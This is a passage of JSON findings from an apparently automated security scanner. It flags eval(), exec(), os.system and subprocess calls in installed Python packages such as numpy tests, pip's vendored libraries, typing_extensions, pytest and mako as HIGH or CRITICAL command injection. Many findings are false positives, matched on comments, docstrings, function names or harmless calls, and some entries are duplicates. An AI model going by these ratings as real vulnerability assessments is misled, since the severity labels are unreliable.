            "context": "            \"\\n\"\n            r\"       b'\\x1B\\x5B\\x33\\x31\\x6D\\x52\\x65\\x64'], dtype='|V8')\")\n\n        assert_equal(eval(repr(a), vars(np)), a)\n        assert_equal(eval(repr(a[0]), {'np': np}), a[0])\n\n    def test_edgeitems_kwarg(self):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_arrayprint.py",
            "line": 341,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(eval(repr(a[0]), {'np': np}), a[0])",
            "context": "            r\"       b'\\x1B\\x5B\\x33\\x31\\x6D\\x52\\x65\\x64'], dtype='|V8')\")\n\n        assert_equal(eval(repr(a), vars(np)), a)\n        assert_equal(eval(repr(a[0]), {'np': np}), a[0])\n\n    def test_edgeitems_kwarg(self):\n        # previously the global print options would be taken over the kwarg",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 1548,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_array_equal(eval(repr(xx), {\"np\": np, \"array\": np.array}), xx)",
            "context": "        assert_equal(xx, [[b'', b''], [b'', b'']])\n        # check for no uninitialized memory due to viewing S0 array\n        assert_equal(xx[:].dtype, xx.dtype)\n        assert_array_equal(eval(repr(xx), {\"np\": np, \"array\": np.array}), xx)\n\n        b = io.BytesIO()\n        np.save(b, xx)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 3933,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "MyType = eval(\"type('MyType', (base,), class_namespace)\",",
            "context": "                              \"class_namespace\": class_namespace,\n                              \"__name__\": alleged_module,\n                              }\n            MyType = eval(\"type('MyType', (base,), class_namespace)\",\n                          eval_namespace)\n            if issubclass(MyType, np.ndarray):\n                # Use this range to avoid special case weirdnesses around",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_scalarmath.py",
            "line": 628,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "#            val2 = eval(val_repr)",
            "context": "#        for t in types:\n#            val = t(1197346475.0137341)\n#            val_repr = repr(val)\n#            val2 = eval(val_repr)\n#            assert_equal( val, val2 )\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_scalarmath.py",
            "line": 654,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val2 = t(eval(val_repr))",
            "context": "                raise ValueError('hmm')\n            val = constr.view(t)[0]\n            val_repr = repr(val)\n            val2 = t(eval(val_repr))\n            if not (val2 == 0 and val < 1e-100):\n                assert_equal(val, val2)\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_records.py",
            "line": 170,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})",
            "context": "        recarr = a.view(np.recarray)\n        recordview = a.view(np.dtype((np.record, a.dtype)))\n\n        recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})\n        recarr_r = eval(\"np.\" + repr(recarr), {'np': np})\n        # Prints the type `numpy.record` as part of the dtype:\n        recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_records.py",
            "line": 171,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "recarr_r = eval(\"np.\" + repr(recarr), {'np': np})",
            "context": "        recordview = a.view(np.dtype((np.record, a.dtype)))\n\n        recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})\n        recarr_r = eval(\"np.\" + repr(recarr), {'np': np})\n        # Prints the type `numpy.record` as part of the dtype:\n        recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_records.py",
            "line": 173,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})",
            "context": "        recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})\n        recarr_r = eval(\"np.\" + repr(recarr), {'np': np})\n        # Prints the type `numpy.record` as part of the dtype:\n        recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})\n\n        assert_equal(type(recordarr_r), np.recarray)\n        assert_equal(recordarr_r.dtype.type, np.record)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath.py",
            "line": 513,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a, b, divisors = eval(ex_val)",
            "context": "        neg = -1 if fo.min < 0 else 1\n        # Large enough to test SIMD loops and remainder elements\n        lsize = 512 + 7\n        a, b, divisors = eval(ex_val)\n        a_lst, b_lst = a.tolist(), b.tolist()\n\n        c_div = lambda n, d: (",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath.py",
            "line": 577,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a = eval(ex_val)",
            "context": "    ))\n    def test_division_int_reduce(self, dtype, ex_val):\n        fo = np.iinfo(dtype)\n        a = eval(ex_val)\n        lst = a.tolist()\n        c_div = lambda n, d: (\n            0 if d == 0 or (n and n == fo.min and d == -1) else n // d",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
            "line": 735,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 10,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile('''",
            "context": "# Windows are correctly handled (it should be \"C:\\\\Users\" not \"C:\\Users\").\n_SETUPTOOLS_SHIM = textwrap.dedent(\n    \"\"\"\n    exec(compile('''\n    # This is <pip-setuptools-caller> -- a caller that pip uses to run setup.py\n    #\n    # - It imports setuptools before invoking setup.py, to enable projects that directly",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile(setup_py_code, filename, \"exec\"))",
            "context": "        filename = \"<auto-generated setuptools caller>\"\n        setup_py_code = \"from setuptools import setup; setup()\"\n\n    exec(compile(setup_py_code, filename, \"exec\"))\n    ''' % ({!r},), \"<pip-setuptools-caller>\", \"exec\"))\n    \"\"\"\n).rstrip()",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/commands/configuration.py",
            "line": 239,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "subprocess.check_call(f'{editor} \"{fname}\"', shell=True)",
            "context": "            )\n\n        try:\n            subprocess.check_call(f'{editor} \"{fname}\"', shell=True)\n        except FileNotFoundError as e:\n            if not e.filename:\n                e.filename = editor",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/results.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "print(f\"{s} -> {fn(eval(s))}\")",
            "context": "        result = date_str.parse_string(\"1999/12/31\")\n\n        def test(s, fn=repr):\n            print(f\"{s} -> {fn(eval(s))}\")\n        test(\"list(result)\")\n        test(\"result[0]\")\n        test(\"result['month']\")",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, namespace, namespace)",
            "context": "            with open(script_filename) as fid:\n                source = fid.read()\n            code = compile(source, script_filename, 'exec')\n            exec(code, namespace, namespace)\n        else:\n            from linecache import cache\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1572,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(script_code, namespace, namespace)",
            "context": "                script_filename,\n            )\n            script_code = compile(script_text, script_filename, 'exec')\n            exec(script_code, namespace, namespace)\n\n    def _has(self, path):\n        raise NotImplementedError(",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/markup.py",
            "line": 184,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "meta_params = literal_eval(parameters)",
            "context": "                            )\n\n                        try:\n                            meta_params = literal_eval(parameters)\n                        except SyntaxError as error:\n                            raise MarkupError(\n                                f\"error parsing {parameters!r} in {open_tag.parameters!r}; {error.msg}\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
            "line": 787,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\n        \"\"\"def reraise(tp, value, tb=None):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "this method is equivalent to running ``eval()`` on the input file. The formatter is",
            "context": "\n    The file is expected to contain a Formatter class named ``formattername``\n    (by default, CustomFormatter). Users should be very careful with the input, because\n    this method is equivalent to running ``eval()`` on the input file. The formatter is\n    given the `options` at its instantiation.\n\n    :exc:`pygments.util.ClassNotFound` is raised if there are any errors loading",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `formattername` from that namespace\n        if formattername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/__init__.py",
            "line": 153,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `lexername` from that namespace\n        if lexername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/six.py",
            "line": 740,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 1396,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 1396,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 3961,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# as a way of emulating annotation scopes when calling `eval()`",
            "context": "\n        # \"Inject\" type parameters into the local namespace\n        # (unless they are shadowed by assignments *in* the local namespace),\n        # as a way of emulating annotation scopes when calling `eval()`\n        if type_params := getattr(obj, \"__type_params__\", ()):\n            locals = {param.__name__: param for param in type_params} | locals\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 3966,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value if not isinstance(value, str) else eval(value, globals, locals)",
            "context": "            locals = {param.__name__: param for param in type_params} | locals\n\n        return_value = {key:\n            value if not isinstance(value, str) else eval(value, globals, locals)\n            for key, value in ann.items() }\n        return return_value\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 4013,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# If we pass None to eval() below, the globals of this module are used.",
            "context": "            elif callable(owner):\n                globals = getattr(owner, \"__globals__\", None)\n\n        # If we pass None to eval() below, the globals of this module are used.\n        if globals is None:\n            globals = {}\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 4025,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# as a way of emulating annotation scopes when calling `eval()`",
            "context": "        if type_params is None and owner is not None:\n            # \"Inject\" type parameters into the local namespace\n            # (unless they are shadowed by assignments *in* the local namespace),\n            # as a way of emulating annotation scopes when calling `eval()`\n            type_params = getattr(owner, \"__type_params__\", None)\n\n        # type parameters require some special handling,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 4030,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# but `eval()` does not have a dedicated parameter for that scope.",
            "context": "\n        # type parameters require some special handling,\n        # as they exist in their own scope\n        # but `eval()` does not have a dedicated parameter for that scope.\n        # For classes, names in type parameter scopes should override\n        # names in the global scope (which here are called `localns`!),\n        # but should in turn be overridden by names in the class scope",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_extensions.py",
            "line": 4058,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = eval(code, globals, locals)",
            "context": "                raise NameError(arg)\n        else:\n            code = forward_ref.__forward_code__\n            value = eval(code, globals, locals)\n        forward_ref.__forward_evaluated__ = True\n        forward_ref.__forward_value__ = value\n        return value",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/__init__.py",
            "line": 1910,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "retrieval (Linux only) a list of frequencies is returned for",
            "context": "        min and max frequency expressed in Mhz.\n\n        If *percpu* is True and the system supports per-cpu frequency\n        retrieval (Linux only) a list of frequencies is returned for\n        each CPU. If not a list with one element is returned.\n        \"\"\"\n        ret = _psplatform.cpu_freq()",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/cli.py",
            "line": 167,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(\"\")",
            "context": "    # Enable VT100 to support ANSI escape codes in Command Prompt on Windows.\n    # See https://github.com/python/cpython/issues/74261 for why this works.\n    if sys.platform == \"win32\":\n        os.system(\"\")\n\n    try:\n        import readline  # noqa: F401",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/incremental/__init__.py",
            "line": 384,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), version_info)",
            "context": "    version_info = {}  # type: Dict[str, Version]\n\n    with open(version_path, \"r\") as f:\n        exec(f.read(), version_info)\n\n    return version_info[\"__version__\"]\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1738,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, namespace, namespace)",
            "context": "        if os.path.exists(script_filename):\n            source = _read_utf8_with_fallback(script_filename)\n            code = compile(source, script_filename, 'exec')\n            exec(code, namespace, namespace)\n        else:\n            from linecache import cache\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1749,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(script_code, namespace, namespace)",
            "context": "                script_filename,\n            )\n            script_code = compile(script_text, script_filename, 'exec')\n            exec(script_code, namespace, namespace)\n\n    def _has(self, path) -> bool:\n        raise NotImplementedError(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/parser.py",
            "line": 668,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return True, eval(node.id)  # pylint: disable=eval-used",
            "context": "        return True, bool(node.value)\n    elif isinstance(node, ast.Name):\n        if node.id in [\"True\", \"False\", \"None\", \"__debug__\"]:\n            return True, eval(node.id)  # pylint: disable=eval-used\n    elif isinstance(node, ast.UnaryOp) and isinstance(node.op, ast.Not):\n        is_constant, val = is_constant_test_expr(node.operand)\n        return is_constant, not val",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/execfile.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, main_mod.__dict__)",
            "context": "        # a non-existent directory.\n        cwd = os.getcwd()\n        try:\n            exec(code, main_mod.__dict__)\n        except SystemExit:                          # pylint: disable=try-except-raise\n            # The user called sys.exit().  Just pass it along to the upper\n            # layers, where it will be handled.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/templite.py",
            "line": 74,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(python_source, global_namespace)",
            "context": "        python_source = str(self)\n        # Execute the source, defining globals, and return them.\n        global_namespace: dict[str, Any] = {}\n        exec(python_source, global_namespace)\n        return global_namespace\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/pytester.py",
            "line": 295,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if eval(check, backlocals, call.__dict__):",
            "context": "            for ind, call in enumerate(self.calls[i:]):\n                if call._name == name:\n                    print(\"NAMEMATCH\", name, call)\n                    if eval(check, backlocals, call.__dict__):\n                        print(\"CHECKERMATCH\", repr(check), \"->\", call)\n                    else:\n                        print(\"NOCHECKERMATCH\", repr(check), \"-\", call)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/skipping.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "If an old-style string condition is given, it is eval()'d, otherwise the",
            "context": "def evaluate_condition(item: Item, mark: Mark, condition: object) -> tuple[bool, str]:\n    \"\"\"Evaluate a single skipif/xfail condition.\n\n    If an old-style string condition is given, it is eval()'d, otherwise the\n    condition is bool()'d. If this fails, an appropriately formatted pytest.fail\n    is raised.\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/skipping.py",
            "line": 118,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = eval(condition_code, globals_)",
            "context": "        try:\n            filename = f\"<{mark.name} condition>\"\n            condition_code = compile(condition, filename, \"eval\")\n            result = eval(condition_code, globals_)\n        except SyntaxError as exc:\n            msglines = [\n                f\"Error evaluating {mark.name!r} condition\",",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/capture.py",
            "line": 1105,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system('echo \"hello\"')",
            "context": "    .. code-block:: python\n\n        def test_system_echo(capfd):\n            os.system('echo \"hello\"')\n            captured = capfd.readouterr()\n            assert captured.out == \"hello\\n\"\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/capture.py",
            "line": 1133,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system('echo \"hello\"')",
            "context": "    .. code-block:: python\n\n        def test_system_echo(capfdbinary):\n            os.system('echo \"hello\"')\n            captured = capfdbinary.readouterr()\n            assert captured.out == b\"hello\\n\"\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cffi/recompiler.py",
            "line": 78,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "flags = eval(self.flags, G_FLAGS)",
            "context": "                + '},')\n\n    def as_python_expr(self):\n        flags = eval(self.flags, G_FLAGS)\n        fields_expr = [c_field.as_field_python_expr()\n                       for c_field in self.c_fields]\n        return \"(b'%s%s%s',%s)\" % (",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cffi/setuptools_ext.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, glob, glob)",
            "context": "        src = f.read()\n    src += '\\n'      # Python 2.6 compatibility\n    code = compile(src, filename, 'exec')\n    exec(code, glob, glob)\n\n\ndef add_cffi_module(dist, mod_spec):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/base_events.py",
            "line": 920,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def subprocess_exec(self, protocol_factory, program, *args,",
            "context": "        return transport, protocol\n\n    @coroutine\n    def subprocess_exec(self, protocol_factory, program, *args,\n                        stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                        stderr=subprocess.PIPE, universal_newlines=False,\n                        shell=False, bufsize=0, **kwargs):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/events.py",
            "line": 391,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def subprocess_exec(self, protocol_factory, *args, stdin=subprocess.PIPE,",
            "context": "                         **kwargs):\n        raise NotImplementedError\n\n    def subprocess_exec(self, protocol_factory, *args, stdin=subprocess.PIPE,\n                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                        **kwargs):\n        raise NotImplementedError",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/subprocess.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def create_subprocess_exec(program, *args, stdin=None, stdout=None,",
            "context": "    return Process(transport, protocol, loop)\n\n@coroutine\ndef create_subprocess_exec(program, *args, stdin=None, stdout=None,\n                           stderr=None, loop=None,\n                           limit=streams._DEFAULT_LIMIT, **kwds):\n    if loop is None:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/subprocess.py",
            "line": 210,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "transport, protocol = yield from loop.subprocess_exec(",
            "context": "        loop = events.get_event_loop()\n    protocol_factory = lambda: SubprocessStreamProtocol(limit=limit,\n                                                        loop=loop)\n    transport, protocol = yield from loop.subprocess_exec(\n                                            protocol_factory,\n                                            program, *args,\n                                            stdin=stdin, stdout=stdout,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 117,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "buffered = eval(node.attributes.get(\"buffered\", \"False\"))",
            "context": "            name = \"render_%s\" % node.funcname\n            args = node.get_argument_expressions()\n            filtered = len(node.filter_args.args) > 0\n            buffered = eval(node.attributes.get(\"buffered\", \"False\"))\n            cached = eval(node.attributes.get(\"cached\", \"False\"))\n            defs = None\n            pagetag = None",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 118,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cached = eval(node.attributes.get(\"cached\", \"False\"))",
            "context": "            args = node.get_argument_expressions()\n            filtered = len(node.filter_args.args) > 0\n            buffered = eval(node.attributes.get(\"buffered\", \"False\"))\n            cached = eval(node.attributes.get(\"cached\", \"False\"))\n            defs = None\n            pagetag = None\n            if node.is_block and not node.is_anonymous:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 131,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cached = eval(pagetag.attributes.get(\"cached\", \"False\"))",
            "context": "                args = pagetag.body_decl.get_argument_expressions()\n                if not pagetag.body_decl.kwargs:\n                    args += [\"**pageargs\"]\n                cached = eval(pagetag.attributes.get(\"cached\", \"False\"))\n                self.compiler.enable_loop = self.compiler.enable_loop or eval(\n                    pagetag.attributes.get(\"enable_loop\", \"False\")\n                )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 132,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.compiler.enable_loop = self.compiler.enable_loop or eval(",
            "context": "                if not pagetag.body_decl.kwargs:\n                    args += [\"**pageargs\"]\n                cached = eval(pagetag.attributes.get(\"cached\", \"False\"))\n                self.compiler.enable_loop = self.compiler.enable_loop or eval(\n                    pagetag.attributes.get(\"enable_loop\", \"False\")\n                )\n            else:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if eval(node.attributes.get(\"inheritable\", \"False\")):",
            "context": "                    \" callables=%s, calling_uri=_template_uri)\"\n                    % (node.name, callable_name)\n                )\n            if eval(node.attributes.get(\"inheritable\", \"False\")):\n                self.printer.writeline(\"context['self'].%s = ns\" % (node.name))\n\n            self.printer.writeline(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 611,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "buffered = eval(node.attributes.get(\"buffered\", \"False\"))",
